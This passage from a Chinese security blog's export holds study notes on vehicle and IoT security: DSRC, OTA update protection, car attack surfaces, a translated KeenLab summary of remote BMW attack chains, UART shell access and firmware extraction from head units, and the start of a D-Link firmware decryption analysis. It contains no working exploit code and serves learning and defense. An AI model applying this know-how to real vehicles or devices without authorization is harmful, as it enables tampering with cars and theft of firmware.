<li><p>3种交互方式：蜂窝网络、专用短程通信技术DSRC、混合方式<a id="more"></a></p>
</li>
<li><p>DSRC：是V2V部署的主要协议，可与其它通信方式混用。车辆在传输DSRC可作为使用V2V的判断依据</p>
</li>
<li><p>其它概念：V2I-车辆对基础设施、V2X-车辆到其它</p>
</li>
</ul>
</li>
<li><p>DSRC</p>
<ul>
<li><p>专为车辆与路旁设备/车辆之间通信而设计的无线系统</p>
</li>
<li><p>有效通信距离由发射功率决定</p>
</li>
<li><p>功能：诊断及维护、道路施工、被盗车辆寻回</p>
</li>
<li><p>路旁DSRC系统：可向车辆传递交通状况等标准化消息，有CAM和DENM两种格式</p>
</li>
<li><p>WAVE标准：基于DSRC的系统，可用于车辆数据包通信</p>
</li>
<li><p>通过DSRC攻击：可自制DRSC接收器，在有效距离内接收车辆信息，达到车辆跟踪的效果</p>
</li>
</ul>
</li>
<li><p>安全问题：如书中图</p>
</li>
<li>基于PKI的安全措施<ul>
<li>//here，未完待续</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车中OTA升级及安全性</title>
    <url>/2021/12/17/iov/%E6%B1%BD%E8%BD%A6%E4%B8%ADOTA%E5%8D%87%E7%BA%A7%E5%8F%8A%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="汽车中OTA升级及安全性"><a href="#汽车中OTA升级及安全性" class="headerlink" title="汽车中OTA升级及安全性"></a>汽车中OTA升级及安全性</h1><h2 id="OTA升级机制"><a href="#OTA升级机制" class="headerlink" title="OTA升级机制"></a>OTA升级机制</h2><ul>
<li>漏洞修复/升级的方式<ul>
<li>插入固件升级的U盘，车主自行升级</li>
<li>前往服务中心，工作人员帮助升级</li>
<li>利用OTA升级机制，远程推送补丁，自动升级修复漏洞</li>
</ul>
</li>
<li><p>OTA升级<a id="more"></a></p>
<ul>
<li>有些厂商的OTA升级只针对车机，而对CAN总线上的ECU升级还需要专用设备</li>
<li>OTA升级面临的安全问题，如固件的保密性及完整性</li>
<li>OTA升级不仅适用于汽车，PC、手机以及摄像头等嵌入式式设备也可以。</li>
</ul>
</li>
<li><p>FOTA即固件升级：将新版本的固件安全烧写到车机或ECU</p>
<ul>
<li>厂家发布新固件到升级服务器</li>
<li>汽车从服务器下载新固件</li>
<li>汽车对固件进行验证、更新</li>
</ul>
</li>
</ul>
<h2 id="OTA安全性"><a href="#OTA安全性" class="headerlink" title="OTA安全性"></a>OTA安全性</h2><ul>
<li><p>OTA升级的安全问题</p>
<ul>
<li>厂家发布新固件到升级服务器<ul>
<li>服务器安全</li>
<li>汽车对服务器的认证</li>
</ul>
</li>
<li>汽车下载固件<ul>
<li>固件的加密传输，保证机密性</li>
<li>断点续传，保证完整性</li>
</ul>
</li>
<li>汽车验证并升级固件<ul>
<li>固件签名：保证完整性，防篡改</li>
<li>固件新鲜性：防止黑客利用包含漏洞的旧版本更新系统然后进行漏洞利用</li>
<li>固件加密：可防止抓包获取固件后，从而造成知识产权泄漏</li>
</ul>
</li>
</ul>
</li>
<li><p>安全的固件升级过程</p>
<ul>
<li>开发新固件、对固件进行加密（防泄漏）、私钥签名（防篡改）</li>
<li>签名后的固件上传到升级服务器</li>
<li>汽车同服务器建立安全的通信链路（防中间人）</li>
<li>汽车通过安全通信链路下载固件</li>
<li>汽车解密固件、验证签名、升级</li>
</ul>
</li>
<li>仍需解决的问题<ul>
<li>密钥和证书的保存及管理：引入防破解的硬件安全模块、每辆汽车需有独自的密钥</li>
<li>要有回滚机制：旧固件需备份，升级失败后可回滚防止变砖</li>
<li>固件更新程序控制更新过程，但其一般跟随设备一般无法更新，故需要保证其代码安全性</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：《智能汽车安全攻防大揭秘》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车安全的攻击面</title>
    <url>/2021/12/13/iov/%E6%B1%BD%E8%BD%A6%E5%AE%89%E5%85%A8%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
    <content><![CDATA[<h1 id="汽车安全的攻击面"><a href="#汽车安全的攻击面" class="headerlink" title="汽车安全的攻击面"></a>汽车安全的攻击面</h1><ul>
<li>安全是一个体系，从系统角度考虑，木桶理论</li>
<li>从两个角度分析攻击向量<ul>
<li>技术能力：攻击者有能力对目标汽车进行恶意利用</li>
<li>可操作性：恶意利用时需要克服的条件限制</li>
</ul>
</li>
<li>限制条件可分三类：间接物理攻击、短距离无线访问、远距离无线访问<a id="more"></a></li>
</ul>
<h2 id="间接物理攻击面"><a href="#间接物理攻击面" class="headerlink" title="间接物理攻击面"></a>间接物理攻击面</h2><ul>
<li>涉及交互的设备/媒介，如要通过OBD进行攻击就要对诊断设备进行恶意修改</li>
<li>OBD-II接口<ul>
<li>与CAN总线相连接，故攻击者可通过此接口访问CAN总线，进而控制汽车</li>
<li>攻击者通常不可直接访问此接口，但可通过OBD盒子与其间接通信</li>
<li>可通过接口设备将OBD与PC连接起来，若攻击PC，也可访问到OBD</li>
</ul>
</li>
<li>车载娱乐系统<ul>
<li>会与光盘、USB接口、手机等设备进行交互，设备中植入恶意程序+社工可实现攻击</li>
<li>通常不是孤立的模块，也会与CAN总线相连，因此可通过其访问汽车内网</li>
<li>娱乐系统也存在操作系统，也可安装应用程序，也是攻击点</li>
<li>具备蓝牙/Wi-Fi/蜂窝网络等功能，也是无线攻击入口</li>
</ul>
</li>
</ul>
<h2 id="短距离无线攻击面"><a href="#短距离无线攻击面" class="headerlink" title="短距离无线攻击面"></a>短距离无线攻击面</h2><ul>
<li><p>简介</p>
<ul>
<li>相对于间接物理攻击，比较灵活</li>
<li>攻击向量：蓝牙、Wi-Fi、RKE/PKE、RFID、TPMS、DSRC</li>
<li>蓝牙和WIFI：无线安全领域的常见话题，不多赘述</li>
</ul>
</li>
<li><p>无钥匙进入系统</p>
<ul>
<li>遥控信号加密后的结果即滚动码</li>
<li>分两种：RKE（类似遥控器）、PKE（智能钥匙）</li>
<li>PKE原理：钥匙按下后、汽车通过天线发送challenge、钥匙接收后将其与密钥结合生成result并发给汽车、汽车验证是否合法</li>
</ul>
</li>
<li>RFID<ul>
<li>用于防盗</li>
<li>钥匙里嵌入RFID芯片，钥匙孔附近有RFID天线</li>
<li>钥匙插入口，RFID与ECU相互认证，不通过则不可启动</li>
<li>Hitag是一种广泛的RFID，采用一种私有的流密码算法</li>
</ul>
</li>
<li>胎压管理系统TPMS<ul>
<li>轮胎上的传感器可将胎压信息发送给相关ECU</li>
<li>传输的信息没有被加密，可被伪造</li>
<li>ECU端解析代码也可能出现问题</li>
</ul>
</li>
<li>专用远距离无线通信DSRC<ul>
<li>典型应用：ETC收费、V2V通信</li>
<li>V2V即车辆间通信，可通过广播预警信息减少事故</li>
<li>V2V或V2X通信时，如何保证信息的机密性和完整性，值得关注</li>
</ul>
</li>
</ul>
<h2 id="远距离无线攻击面"><a href="#远距离无线攻击面" class="headerlink" title="远距离无线攻击面"></a>远距离无线攻击面</h2><ul>
<li>攻击面<ul>
<li>用于定位的GPS</li>
<li>用于数据通信的蜂窝网络</li>
<li>远程协助系统，如OnStar</li>
<li>远程控制系统，如Jeep Uconnect、BWM connectedDrive</li>
</ul>
</li>
<li>对于汽车安全威胁最大，因为可远程发起攻击</li>
</ul>
<blockquote>
<p>参考：《智能汽车安全攻防大揭秘》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>宝马汽车实验安全评估-总结报告</title>
    <url>/2021/12/02/iov/%E5%AE%9D%E9%A9%AC%E6%B1%BD%E8%BD%A6%E5%AE%9E%E9%AA%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0-%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="宝马汽车实验安全评估-总结报告"><a href="#宝马汽车实验安全评估-总结报告" class="headerlink" title="宝马汽车实验安全评估-总结报告"></a>宝马汽车实验安全评估-总结报告</h1><h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h1><ul>
<li><p>近年来，越来越多的BMW汽车配备了新一代的“互联网连接”信息娱乐系统（如HU_NBT/HU_ENTRYNAV），也称为主机单元和远程通信控制单元（如TCB）。虽然这些组件明显提高了用户体验的便利性和性能，但它们也带来了新的被攻击机会。</p>
</li>
<li><p>在我们的工作中，我们系统地对多辆BMW汽车的Head Unit、TCU和中央网关模块的软硬件进行了深入和全面的分析。重点关注这些部件的外部攻击面后，我们发现，通过一组远程攻击面（包括GSM通信、BMW远程服务、BMW ConnectedDrive服务、UDS远程诊断、NGTP协议以及蓝牙协议），在广泛的区域内，对多辆连接互联网的BMW汽车进行远程的定点攻击是可行的。因此，对于攻击者而言，通过利用复杂攻击链（由不同汽车组件中的漏洞组成），可以很容易的获取对汽车CAN总线的远程控制。除此之外，即便车辆不可以联网，也可以通过物理访问方式（比如USB、以太网以及ODB-II接口）来威胁到Head Unit主机单元。我们根据测试可以确认，所有的漏洞将会影响到各种现代宝马车型。<a id="more"></a></p>
</li>
<li><p>我们的研究结果表，在选定BMW车辆模块的一定速度以上，可以获取到对信息娱乐系统、T-Box组件和UDS通信的本地和远程访问权限，并且能够通过任意代码执行、未经授权的车内系统诊断请求来获取到对CAN总线的远程控制。</p>
</li>
<li><p>本次报告总结了我们的研究结果，结构如下：</p>
<ul>
<li><p>章节2-4，描述了在技术受控级别（没有任何的可利用的技术细节）上的漏洞发现及攻击链</p>
</li>
<li><p>章节5，概述了受影响的宝马车型。</p>
</li>
<li><p>章节6，描述了披露过程。</p>
</li>
<li><p>章节6，对本次研究作出总结。</p>
</li>
</ul>
</li>
</ul>
<h1 id="2-研究描述"><a href="#2-研究描述" class="headerlink" title="2. 研究描述"></a>2. 研究描述</h1><ul>
<li><p>从安全角度来看，现代宝马汽车暴露了几个远程攻击面和一个物理攻击面。在本文中，我们重点关注了三个重要的车辆组件：信息娱乐系统（也称为Head Unit主机）、TCU（远程通信控制单元）和中央网关模块，它们容易受到外部攻击的影响。基于我们对宝马汽车车内网络的研究，我们发现这三个组件通过物理总线（如USB、CAN总线、以太网）与其他组件联系紧密。</p>
</li>
<li><p>图示：宝马车的内部网络</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081654.jpg" alt="image-20211219111024113"></p>
</li>
<li><p>在对固件进行深入的安全分析后，我们在这些车辆组件中发现14个漏洞。所有的软件漏洞可以通过在线重新配置和离线固件更新（而非OTA升级）来修复。</p>
</li>
<li><p>目前，宝马厂商正在制定漏洞修复计划，一些优先级较高的应对措施已开始实施。因此，我们决定在本文中进行一次简短的漏洞披露，而非对宝马用户不负责任的全面披露。完整的技术漏洞报告将在2019年的适当时间发布。</p>
</li>
</ul>
<h2 id="2-1-信息娱乐系统"><a href="#2-1-信息娱乐系统" class="headerlink" title="2.1 信息娱乐系统"></a>2.1 信息娱乐系统</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081705.jpg" alt="image-20211219112256232"></p>
<ul>
<li><p>BWM汽车的车载信息娱乐系统（也称NBT主机）由两部分组成：hu-intel系统和hu-jacinto系统。</p>
<ul>
<li><p><strong>hu-intel</strong>：运行在高层芯片（Intel x86）上的QNX系统，主要负责多媒体服务和BMW ConnectedDrive服务。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081703.jpg" alt="image-20211219112758700"></p>
</li>
<li><p><strong>hu-jacinto</strong>：运行在Jacinto ARM芯片（负责电源管理和CAN总线通信的底层芯片）上的QNX系统。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-81655.jpg" alt="image-20211219112847610"></p>
</li>
</ul>
</li>
<li><p>hu-intel和hu-jacinto都可以通过QNET来互相通信。TCU通过USB连接到hu-intel，Head Unit主机与BMW远程服务器之间的通信数据将在此传输。hu-jacinto和TCU通过K-CAN总线（专门用于信息娱乐）连接。为了安全隔离，从hu-intel到中央网关模块的以太网连接被以太网交换机隔断，在较新的宝马汽车（如I3）中，中央网关模块和以太网交换机都集成到车身控制器模块（BDC/FEM）中。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-81705.jpg" alt="image-20211219115345674"></p>
</li>
</ul>
<h3 id="2-1-1-USB接口"><a href="#2-1-1-USB接口" class="headerlink" title="2.1.1 USB接口"></a>2.1.1 USB接口</h3><ul>
<li><p>NBT在QNX OS中提供一些内置的io-pkt网络驱动程序，用于通过USB接口建立以太网网络。根据hu-intel中的USB配置文件，它默认支持某些USB-to-ETHERNET适配器。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081659.jpg" alt="image-20211219133912485"></p>
</li>
<li><p>通过网络驱动程序，当插入特定芯片组的USB dongle时，将启用USB-Ethernet网络。NBT主机将充当具有固定IP地址（192.168.0.1）的网络网关。更糟糕的是，这种USB Ethernet接口没有任何安全限制，因此导致可以获取到主机内部网络的访问权限，可以通过端口扫描检测到许多暴露的内部服务。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081704.jpg" alt="image-20211219134446954"></p>
</li>
<li><p>本地代码执行：有许多更新服务（比如导航及软件更新）运行在hu-intel系统之上，这些服务也用来监视U盘。当U盘中提供了预期的更新内容时，NBT将会进入一个特定的升级阶段。有些内容是被BMW私钥加密过的，有些则不然，这使得我们有机会以root权限控制hu-intel系统（在U盘中准备格式错误的内容，并利用更新服务中存在的漏洞）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081657.jpg" alt="image-20211219135406898"></p>
</li>
<li><p>还有另外一种可以获取root shell的方法，晚一点会介绍。</p>
</li>
</ul>
<h3 id="2-1-2-OBD-II之上的E-NET"><a href="#2-1-2-OBD-II之上的E-NET" class="headerlink" title="2.1.2 OBD-II之上的E-NET"></a>2.1.2 OBD-II之上的E-NET</h3><ul>
<li><p>E-NET是一个车载以太网网络，位于宝马汽车的OBD-II接口上。汽车工程师可以通过E-NET连接到中央网关，对主机进行离线诊断和固件更新。在hu-intel系统中，也有相应的诊断服务， 负责处理来自中央网关的请求。对中央网关和NBT之间的诊断协议进行逆向后，我们发现了可用于绕过代码签名机制的漏洞，并成功地从hu-intel系统获得了root-shell。</p>
</li>
<li><p>此外，考虑一种低成本的方式：通过使用USB-Ethernet dongle，黑客也可以获取更高层次的QNX系统的root权限。此系统位于en5接口，且拥有固定ip地址(192.168.0.1)。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081658.jpg" alt="image-20211219142927502"></p>
</li>
</ul>
<h3 id="2-1-3-蓝牙协议栈"><a href="#2-1-3-蓝牙协议栈" class="headerlink" title="2.1.3 蓝牙协议栈"></a>2.1.3 蓝牙协议栈</h3><ul>
<li><p>通过内置的蓝牙功能，NBT允许手机连接到它进行免提通话。即然我们已经获取到了hu-intel系统的root权限，因此我们确定了负责处理蓝牙功能的特定服务。通过逆向工程，我们发现它使用了第三方蓝牙协议栈库，其是蓝牙协议栈管理和服务组件的实现。在fuzz蓝牙协议栈之后，最终得到一个可以导致内存崩溃的畸形数据包。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-81658.jpg" alt="image-20211219143335508"></p>
</li>
<li><p>因此，将NBT设置为配对模式，可以在没有PIN码的情况下，利用该漏洞使hu-intel系统中的蓝牙协议栈崩溃。由于内部watchdog机制的存在，因此主机会重新启动。</p>
</li>
</ul>
<h3 id="2-1-4-ConnectedDrive服务"><a href="#2-1-4-ConnectedDrive服务" class="headerlink" title="2.1.4 ConnectedDrive服务"></a>2.1.4 ConnectedDrive服务</h3><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081701.jpg" alt="image-20211219145059185"></p>
<ul>
<li><p>NBT中的BMW ConnectedDrive服务通过内置在TCU中的嵌入式SIM卡来实现蜂窝网络连接，为客户提供广泛的在线功能，包括ConnectedDrive商店、远程服务、实时交通信息（RTTI）、智能紧急呼叫、在线天气和在线新闻。ConnectedDrive服务提供的大多数在线功能都是由车载浏览器处理的，在NBT中被称为“DevCtrlBrowser_Bon”（使用定制的浏览器引擎，似乎是由Harman 为车载信息娱乐系统开发的）。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081700.jpg" alt="image-20211219145518431"></p>
</li>
<li><p>远程代码执行：使用USRP（universal software radio peripheral）和OpenBTS实现了稳定的GSM网络后，所有来自ConnectedDrive服务的流量都将被捕获，并且由于ConnectedDrive服务的一些不安全实现，我们还成功拦截了来自ConnectedDrive服务的网络流量。在那之后，我们可以很轻松的在在“DevCtrlBrowser_Bon”中发现bug。之后，我们利用其一个内存破坏漏洞，在主机中实现了浏览器权限的远程代码执行。最后，结合之前的漏洞利用，实现了root提权，并获取了NBT的远程root shell（不同于2.1.1章节的方法）</p>
</li>
</ul>
<h3 id="2-1-5-K-CAN总线"><a href="#2-1-5-K-CAN总线" class="headerlink" title="2.1.5 K-CAN总线"></a>2.1.5 K-CAN总线</h3><ul>
<li>在利用上述漏洞，获取到高层QNX系统（hu-intel）的访问权限后，还可以通过QNET登录到底层的hu-Jacino。如上所述，hu-jacinto运行在Jacinto ARM芯片上，负责处理CAN消息。通过深入分析，我们找到了在K-CAN总线上发送任意CAN消息的两种方法：<ol>
<li>尽管datasheet不对外开放，但可以重用CAN总线驱动程序（TI开发的BSP项目）中的一些源代码，操控Jacinto芯片的特定内存来发送CAN消息。</li>
<li>通过动态hook 驱动程序中CAN消息传输的函数，可以稳定地向K-CAN总线发送任意CAN消息。</li>
</ol>
</li>
<li>结合这些漏洞，可以远程破坏NBT。之后，可以利用中央网关模块中一些特殊的远程诊断接口，来发送任意诊断消息（UDS），控制不同CAN总线上的ECU。</li>
</ul>
<h2 id="2-2-远程通信控制单元TCU"><a href="#2-2-远程通信控制单元TCU" class="headerlink" title="2.2 远程通信控制单元TCU"></a>2.2 远程通信控制单元TCU</h2><ul>
<li><p>TCU通过蜂窝网络为车辆提供电话功能、远程通信服务（如E-Call、B-Call等）以及远程服务（如远程解锁、温度控制等）。在本节中，我们的目标是德国“Peiker Acustic GmbH”生产的远程通信箱（TCB）控制单元，它是现代宝马汽车中使用的最广泛TCU，配备了NBT和ENTRYNAV头部单元。</p>
</li>
<li><p>硬件架构：TCB控制单元可以分成两部分，高层部分是MPU（基于带有AMSS RTOS的高通MDM6200基带处理器），借助嵌入SIM卡，MDM6200负责TCB和BMW远程服务器之间的远程通信。低层部分是MCU（基于飞思卡尔9S12X的CAN控制器），通过K-CAN总线直接连接到中央网关模块。MPU使用基于UART的IPC机制与MCU通信。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-081702.jpg" alt="image-20211219155801751"></p>
</li>
<li><p>软件架构：TCB控制单元是BMW ConnectedDrive系统功能的平台之一，TCB可以建立到GSM和UMTS的网络连接，在我们对固件的逆向过程中，发现TCB支持以下功能：</p>
<ol>
<li>增强的紧急呼叫</li>
<li>BWM的远程服务（比如远程车门开锁等）</li>
<li>BMW TeleService诊断，包括TeleService帮助</li>
<li>BMW TeleService Call</li>
<li>BMW LastStateCall</li>
<li>其它</li>
</ol>
</li>
<li><p>REX OS（实时执行操作系统）在TCB的MPU上运行，其是高通公司为基于ARM的高级模式用户软件(AMSS)开发的操作系统，有60多个系统任务（“CallManager”, “Diag_task”, “Voice”, “GPRS LLC”等），以及大约34个应用程序任务（“NGTPD”, “NAD Diag”, “SMSClient”, “LastStateCall”等）。</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-12-19-81701.jpg" alt="image-20211219161620673"></p>
</li>
</ul>
<h3 id="2-2-1-Remote-Service-with-NGTP"><a href="#2-2-1-Remote-Service-with-NGTP" class="headerlink" title="2.2.1 Remote Service with NGTP"></a>2.2.1 Remote Service with NGTP</h3><p>未完待续…</p>
<blockquote>
<p>原文链接：</p>
<p>腾讯科恩实验室最新汽车安全研究成果:宝马多款车型的安全研究综述：<a href="https://keenlab.tencent.com/zh/2018/05/22/New-CarHacking-Research-by-KeenLab-Experimental-Security-Assessment-of-BMW-Cars/" target="_blank" rel="noopener">https://keenlab.tencent.com/zh/2018/05/22/New-CarHacking-Research-by-KeenLab-Experimental-Security-Assessment-of-BMW-Cars/</a></p>
<p><a href="https://keenlab.tencent.com/en/whitepapers/Experimental_Security_Assessment_of_BMW_Cars_by_KeenLab.pdf" target="_blank" rel="noopener">https://keenlab.tencent.com/en/whitepapers/Experimental_Security_Assessment_of_BMW_Cars_by_KeenLab.pdf</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>车机分析及固件提取</title>
    <url>/2021/11/28/iov/%E8%BD%A6%E6%9C%BA%E5%88%86%E6%9E%90%E5%8F%8A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/</url>
    <content><![CDATA[<h2 id="车机分析及固件提取"><a href="#车机分析及固件提取" class="headerlink" title="车机分析及固件提取"></a>车机分析及固件提取</h2><ul>
<li>概要：车联网系统架构、UART、获取shell提取固件</li>
<li>获取车机端固件<ol>
<li>官网提供升级固件</li>
<li>硬件调试接口JTAG获取固件</li>
<li>读取Flash芯片获取固件</li>
<li>通过串口获取车机系统Shell权限，进而对固件进行打包</li>
<li>利用车机固件更新API，从云端获取更新固件</li>
<li>云端信息泄露，如FTP弱口令或未授权接口获取车机固件</li>
</ol>
</li>
<li>不同厂商的车联网架构不同，但总体可分为4部分：<ol>
<li>信息娱乐系统(IVI)</li>
<li>车载网关(TBOX)</li>
<li>手机端车联网应用(APP)：此类APP功能如车主服务，应用商城，远程控车</li>
<li>车联网云平台服务(TSP)：以云的形式向用户侧/车辆侧提供用户信息维护、车辆定位、状态监控等服务</li>
</ol>
</li>
<li>IVI：车载信息娱乐系统(In-Vehicle Infotainment)。<ul>
<li>早期CD机的音频播放，车联网功能后，可通过蜂窝网络接入互联网</li>
<li>常见功能：实时导航，网页浏览，视频播放，手机投屏，语音控车</li>
<li>具备一定CAN总线能力，因此其”功能外溢”现象产生的攻击面，可能会导致控车漏洞</li>
</ul>
</li>
<li>T-BOX：车载网关(Telematics BOX)。<ul>
<li>负责车机内部的以太网通信，同时提供联网能力，实现车端与云平台(TSP)的远程长连接</li>
<li>具备一定CAN总线能力，也是数字钥匙(手机控车)的实现载体</li>
<li>通过数字钥匙，可通过手机对车辆进行远程操控(云钥匙)、近场操控(蓝牙/NFC钥匙)</li>
</ul>
</li>
<li>Uart<ul>
<li>通用异步收发传输器，一种串行异步收发协议</li>
<li>原理：将数据的二进制位一位一位的进行传输，信号线上的状态位，高电平代表’1’低电平代表’0’</li>
</ul>
</li>
<li>波特率<ul>
<li>当两个设备使用UART串口通讯时，必须先约定好传输速率，即波特率</li>
<li>典型的波特率：300，1200，2400，9600，19200，38400，115200</li>
<li>试过每一个波特率还是无法接收到可见字符，说明：找错了串口、本身传输的数据是不可见字符</li>
</ul>
</li>
<li>Uart三根线<ul>
<li>TX：发送数据端，要接对面设备的RX</li>
<li>RX：接收数据端，要接对面设备的TX</li>
<li>GND：保证两设备共地，有统一的参考平面</li>
</ul>
</li>
<li>uart的数据包：起始位、数据位、停止位</li>
<li>配件：液晶显示屏、车机、二者的连接线</li>
<li>分析前需要先通电，车机上会标注出一些信息，7号BAT接正极，8号GND接负极，4号ACC_IN接正极</li>
<li>车联网厂商：有的将车载网关(T-Box)与信息娱乐系统(IVI)集成到同一Linux中，有的会将二者分开</li>
<li>一般单片机的MCU都没有shell，故不必关注mcu的串口</li>
<li>找串口：直接标出<code>rx tx</code>、需要根据经验猜测、万用表找</li>
<li>提取固件，根据硬件功能来分析<ul>
<li>车机有wifi功能，通过工程模式开启wifi热点，<code>WiFi→FTP/TFTP→PC</code></li>
<li>通过串口文件传输协议，直接提取固件，<code>Uart→Xmodem/Ymodem/Zmodem→PC</code></li>
</ul>
</li>
<li>三种协议<ul>
<li>Xmodem：异步文件传输协议，需要对每个块都进行认可，导致性能下降</li>
<li>Ymodem：Xmodem改良版，协议控制符、传输流程与Xmodem相同，差别在数据帧</li>
<li>Zmodem：串流传输方式，速度最快</li>
<li>工具：minicom、SecureCRT</li>
</ul>
</li>
<li>使用SecureCRT可直接下载/上传文件，如果芯片系统里存在lrzsz，可以直接用Zmodem，命令 sz filename即可下载</li>
</ul>
<blockquote>
<p>参考：<a href="https://mp.weixin.qq.com/s/IIqg3ePO6MNY-pxcpGYv1w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IIqg3ePO6MNY-pxcpGYv1w</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
        <tag>固件提取</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link DIR3060固件加解密算法分析</title>
    <url>/2021/11/26/iot/D-Link%20DIR3060%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="00-简介"><a href="#00-简介" class="headerlink" title="00-简介"></a>00-简介</h2><ul>
<li>文章概要：D-Link DIR3060加解密算法以及固件结构的分析</li>
<li><p>PS：手头没啥现成的文章，找了一篇自己的学习笔记，当时初入iot大坑，记录的比较详细，按照自己的理解，对原文做了一定补充和总结，算是半翻译半原创，希望可以帮助到新人，还望大家不吝指教。</p>
</li>
<li><p>结合原文食用更佳：</p>
<ul>
<li><a href="https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/" target="_blank" rel="noopener">Breaking the D-Link DIR3060 Firmware Encryption - Recon - Part 1</a></li>
<li><a href="https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-static-analysis-of-the-decryption-routine-part-2-1/" target="_blank" rel="noopener">Breaking the D-Link DIR3060 Firmware Encryption - Static analysis of the decryption routine - Part 2.1</a></li>
<li><a href="https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-static-analysis-part-2/" target="_blank" rel="noopener">Breaking the D-Link DIR3060 Firmware Encryption - Static analysis of the decryption routine - Part 2.2</a></li>
</ul>
</li>
</ul>
<h2 id="01-逆向分析"><a href="#01-逆向分析" class="headerlink" title="01-逆向分析"></a>01-逆向分析</h2><ul>
<li><p>lwl, lwr：未对齐内存的访问</p>
</li>
<li><p>大小端问题</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">$v0:</span><br><span class="line">          ↓</span><br><span class="line"><span class="number">00000000</span>: <span class="number">5348</span> <span class="number">5253</span> <span class="number">00</span>d1 d9a6 <span class="number">00</span>d1 d9b0 <span class="number">67</span>c6 <span class="number">6973</span>  SHRS........g.is</span><br><span class="line"><span class="number">00000010</span>: <span class="number">51f</span>f <span class="number">4</span>aec <span class="number">29</span>cd baab f2fb e346 fda7 <span class="number">4</span>d06  Q.J.)......F..M.</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">lwl $v1 <span class="number">11</span>($v0):</span><br><span class="line">                                      ↓</span><br><span class="line"><span class="number">00000000</span>: <span class="number">5348</span> <span class="number">5253</span> <span class="number">00</span>d1 d9a6 <span class="number">00</span>d1 d9b0 <span class="number">67</span>c6 <span class="number">6973</span>  SHRS........g.is</span><br><span class="line"><span class="number">00000010</span>: <span class="number">51f</span>f <span class="number">4</span>aec <span class="number">29</span>cd baab f2fb e346 fda7 <span class="number">4</span>d06  Q.J.)......F..M.</span><br><span class="line">[...]</span><br><span class="line">--&gt; $v1 = b0d9</span><br></pre></td></tr></table></figure>
</li>
<li><p>python实现字节转整数</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">int.from_bytes(<span class="string">b'\xb0\xd9\xd1\x00'</span>, byteorder=<span class="string">'little'</span>, signed=<span class="keyword">False</span>)</span><br><span class="line"><span class="number">13752752</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> htonl</span><br><span class="line">htonl(<span class="number">0xb0d9d100</span>)</span><br><span class="line"><span class="number">13752752</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>wc -c DIR_882_FW120B06.BIN：-c, –bytes</p>
</li>
<li><p>xargs命令的作用，是将标准输入转为命令行参数</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> wc -c DIR_882_FW120B06.BIN | cut -d<span class="string">' '</span> -f1 | xargs <span class="built_in">printf</span> <span class="string">'0x%x\n'</span>     </span></span><br><span class="line">0xd1f247</span><br></pre></td></tr></table></figure>
</li>
<li><p>SHA512_Init, SHA512_Update, SHA512_Final，计算hash值的一组函数，最终 return a pointer to the hash value</p>
</li>
<li><p>hexdump</p>
